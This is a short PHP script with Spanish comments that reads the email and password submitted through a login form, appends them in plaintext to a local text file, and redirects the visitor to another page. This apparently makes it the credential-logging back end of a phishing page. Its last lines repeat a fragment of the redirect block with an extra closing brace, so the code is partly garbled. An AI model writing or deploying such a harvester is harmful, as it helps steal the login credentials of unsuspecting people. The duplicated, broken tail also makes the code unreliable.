<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Captura los datos del formulario
    $email = $_POST['login'];
    $password = $_POST['password'];

    // Ruta del archivo de texto donde se almacenarán los datos
    $file = 'datos_formulario.txt';

    // Formato de los datos a almacenar
    $data = "Datos del inicio de sesión:\n";
    $data .= "Correo electrónico: " . $email . "\n";
    $data .= "Contraseña: " . $password . "\n";
    $data .= "------------------------\n";

    // Escribir los datos en el archivo de texto
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    // Redirigir al usuario a otra página
    header('Location: web.html');
    exit(); // Asegúrate de detener la ejecución del script después de redirigir
}
?>

    // Redirigir al usuario a otra página
    header('Location: web.html');
    exit(); // Asegúrate de detener la ejecución del script después de redirigir
}
?>